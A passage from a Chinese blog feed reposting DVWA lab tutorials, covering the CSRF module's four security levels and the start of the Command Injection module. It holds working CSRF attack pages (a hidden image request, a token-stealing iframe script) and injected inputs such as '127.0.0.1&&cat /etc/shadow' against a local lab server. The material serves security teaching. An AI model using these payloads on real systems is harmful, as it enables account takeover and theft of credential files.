可以看到，服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现= =）。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>1、构造链接</p><p>A) 最基础的:</p><p><a href="">http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a></p><p>当受害者点击了这个链接，他的密码就会被改成password（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了）</p><p><a href="http://image.3001.net/images/20161031/14778953244372.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161031/14778953244372.png!small" alt="1.png"></a> </p><p>需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p><p><a href="http://image.3001.net/images/20161031/14778953704168.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161031/14778953704168.png!small" alt="1.png"></a></p><p>有人会说，这个链接也太明显了吧，不会有人点的，没错，所以真正攻击场景下，我们需要对链接做一些处理。</p><p>B) 我们可以使用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）：</p><p>如<a href="http://dwz.cn/" target="_blank" rel="noopener">http://dwz.cn/</a></p><p><a href="http://image.3001.net/images/20161031/14778954786668.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161031/14778954786668.png!small" alt="1.png"></a></p><p>因为本地搭的环境，服务器域名是ip所以无法生成相应的短链接= =，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的。</p><p><a href="http://image.3001.net/images/20161031/14778955097586.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161031/14778955097586.png!small" alt="1.png"></a> </p><p>需要提醒的是，虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。</p><p>C) 构造攻击页面</p><p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示（才不是我租不起服务器= =），就在本地写一个test.html，下面是具体代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>/&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。</p><p><a href="http://image.3001.net/images/20161031/14778955408376.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161031/14778955408376.png!small" alt="1.png"></a> </p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a><strong>Medium</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Checks to see where the request came from </span></span><br><span class="line">    <span class="keyword">if</span>( eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ) ) &#123; </span><br><span class="line">        <span class="comment">// Get input </span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match? </span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            <span class="comment">// They do! </span></span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">            $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database </span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Issue with passwords matching </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Didn't come from a trusted source </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相关函数说明</p><p>int eregi(string pattern, string string)</p><p>检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。</p><p>可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.153.130），希望通过这种机制抵御CSRF攻击。</p><p><a href="http://image.3001.net/images/20161031/14778955793490.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161031/14778955793490.png!small" alt="1.png"></a></p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.153.130）</p><p>我们可以将攻击页面命名为192.168.153.130.html（页面被放置在攻击者的服务器里，这里是10.4.253.2）就可以绕过了</p><p><a href="http://image.3001.net/images/20161031/14778956078386.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161031/14778956078386.png!small" alt="1.png"></a> </p><p>下面是Burpsuite的截图</p><p><a href="http://image.3001.net/images/20161031/1477895636890.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161031/1477895636890.png!small" alt="1.png"></a> </p><p>Referer参数完美绕过过滤规则</p><p><a href="http://image.3001.net/images/20161031/14778956835405.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161031/14778956835405.png!small" alt="1.png"></a></p><p>密码修改成功</p><p><a href="http://image.3001.net/images/20161031/14778957125554.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161031/14778957125554.png!small" alt="1.png"></a></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a><strong>High</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match? </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</p><p>试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined">    function attack()  &#123;   document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;  document.getElementById("transfer").submit();   &#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.153.130/dvwa/vulnerabilities/csrf"</span> <span class="attr">id</span>=<span class="string">"hack"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"attack()"</span>&gt;</span>  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">id</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://192.168.153.130/dvwa/vulnerabilities/csrf"</span>&gt;</span>   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_new"</span> <span class="attr">value</span>=<span class="string">"password"</span>&gt;</span>    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_conf"</span> <span class="attr">value</span>=<span class="string">"password"</span>&gt;</span>   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_token"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span>  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span>&gt;</span>   <span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。</p><p>然而理想与现实的差距是巨大的，这里牵扯到了跨域问题，而现在的浏览器是不允许跨域请求的。这里简单解释下跨域，我们的框架iframe访问的地址是<a href="">http://192.168.153.130/dvwa/vulnerabilities/csrf</a>，位于服务器192.168.153.130上，而我们的攻击页面位于黑客服务器10.4.253.2上，两者的域名不同，域名B下的所有页面都不允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。</p><p>由于跨域是不能实现的，所以我们要将攻击代码注入到目标服务器192.168.153.130中，才有可能完成攻击。下面利用High级别的XSS漏洞协助获取Anti-CSRF token（因为这里的XSS注入有长度限制，不能够注入完整的攻击脚本，所以只获取Anti-CSRF token）。</p><p><a href="http://image.3001.net/images/20161031/14778957473585.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161031/14778957473585.png!small" alt="1.png"></a> </p><p>这里的Name存在XSS漏洞，于是抓包，改参数，成功弹出token</p><p><a href="http://image.3001.net/images/20161031/1477895775866.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161031/1477895775866.png!small" alt="1.png"></a> </p><p>注入代码如下</p><p><a href="http://image.3001.net/images/20161031/14778958053271.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161031/14778958053271.png!small" alt="1.png"></a> </p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a><strong>Impossible</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_curr = $_GET[ <span class="string">'password_current'</span> ]; </span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise current password input </span></span><br><span class="line">    $pass_curr = stripslashes( $pass_curr ); </span><br><span class="line">    $pass_curr = mysql_real_escape_string( $pass_curr ); </span><br><span class="line">    $pass_curr = md5( $pass_curr ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the current password is correct </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':password'</span>, $pass_curr, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do both new passwords match and does the current password match the user? </span></span><br><span class="line">    <span class="keyword">if</span>( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// It does! </span></span><br><span class="line">        $pass_new = stripslashes( $pass_new ); </span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database with new password </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':password'</span>, $pass_new, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="DVWA教程" scheme="http://wlfsky.com/tags/DVWA%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DVWA之Command Injection</title>
    <link href="http://wlfsky.com/2018/01/19/DVWA%E4%B9%8BCommand-Injection/"/>
    <id>http://wlfsky.com/2018/01/19/DVWA之Command-Injection/</id>
    <published>2018-01-19T07:30:03.000Z</published>
    <updated>2018-01-19T08:20:41.901Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><p><strong><em>本文转载自 FreeBuf.COM：lonehand</em></strong></p><h2 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a><strong>DVWA简介</strong></h2><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><p>DVWA共有十个模块，分别是</p><blockquote><p>Brute Force（蛮力攻击）</p><p>Command Injection（命令行注入）</p><p>CSRF（跨站请求伪造）</p><p>File Inclusion（文件包含）</p><p>File Upload（文件上传）</p><p>Insecure CAPTCHA （不安全的验证码）</p><p>SQL Injection（SQL注入）</p><p>SQL Injection（Blind）（SQL盲注）</p><p>XSS（Reflected）（反射型跨站脚本）</p><p>XSS（Stored）（存储型跨站脚本）</p></blockquote><p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。</p><p><img src="/img/dvwa-sql-1.png" alt="dvwa-sql-1.png"></p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a><strong>Command Injection</strong></h2><p>Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。</p><p><a href="http://image.3001.net/images/20161016/14765776616648.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161016/14765776616648.png!small" alt="漏洞提醒.png"></a></p><p><strong>下面对四种级别的代码进行分析。</strong></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a><strong>Low</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// Windows </span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// *nix </span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target ); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相关函数介绍 </p><p><em>stristr(string,search,before_search)</em></p><p>stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的ASCII值的字符），可选参数before_true为布尔型，默认为“false”，如果设置为“true”，函数将返回search参数第一次出现之前的字符串部分。</p><p><em>php_uname(mode)</em></p><p>这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。</p><p>可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>window和linux系统都可以用&amp;&amp;来执行多条命令</p><p>127.0.0.1&amp;&amp;net user</p><p><a href="http://image.3001.net/images/20161016/14765776761898.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161016/14765776761898.png!small" alt="漏洞利用"></a></p><p>Linux下输入127.0.0.1&amp;&amp;cat /etc/shadow甚至可以读取shadow文件，可见危害之大。</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a><strong>Medium</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist </span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>( </span><br><span class="line">        <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">    ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist). </span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// Windows </span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// *nix </span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target ); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，相比Low级别的代码，服务器端对ip参数做了一定过滤，即把”&amp;&amp;” 、”;”删除，本质上采用的是黑名单机制，因此依旧存在安全问题。</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>1、127.0.0.1&amp;net user</p><p>因为被过滤的只有”&amp;&amp;”与” ;”，所以”&amp;”不会受影响。</p><p><a href="http://image.3001.net/images/20161016/14765777056753.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161016/14765777056753.png!small" alt="漏洞利用 2"></a></p><p>这里需要注意的是”&amp;&amp;”与” &amp;”的区别：</p><p>Command 1&amp;&amp;Command 2</p><p>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</p><p><a href="http://image.3001.net/images/20161016/1476577730171.png" target="_blank" rel="noopener"><img 